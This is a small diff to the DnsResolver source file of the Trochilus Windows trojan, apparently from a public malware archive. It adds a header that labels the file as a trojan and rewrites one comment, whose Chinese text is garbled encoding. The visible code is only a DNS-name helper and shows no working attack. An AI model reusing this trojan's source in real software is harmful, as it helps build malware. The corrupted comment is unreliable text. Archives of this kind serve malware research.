@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "DnsResolver.h"
  
@@ -123,7 +134,7 @@ std::string CDnsResolver::SliceStringByDot(const char *sz)
             ucLen = 0;
             strBuf.clear();
         }
-        else if (strBuf.length() < 0xc0) //Ã¿¶ÎµÄ³¤¶È±ØÐëÐ¡ÓÚ0xc0, ³¬³ö²¿·ÖÖ±½Ó½Ø¶Ï
+        else if (strBuf.length() < 0xc0) //Ã¿ï¿½ÎµÄ³ï¿½ï¿½È±ï¿½ï¿½ï¿½Ð¡ï¿½ï¿½0xc0, ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö±ï¿½Ó½Ø¶ï¿½
         {
             strBuf.append(&chTmp, sizeof(chTmp));
         }
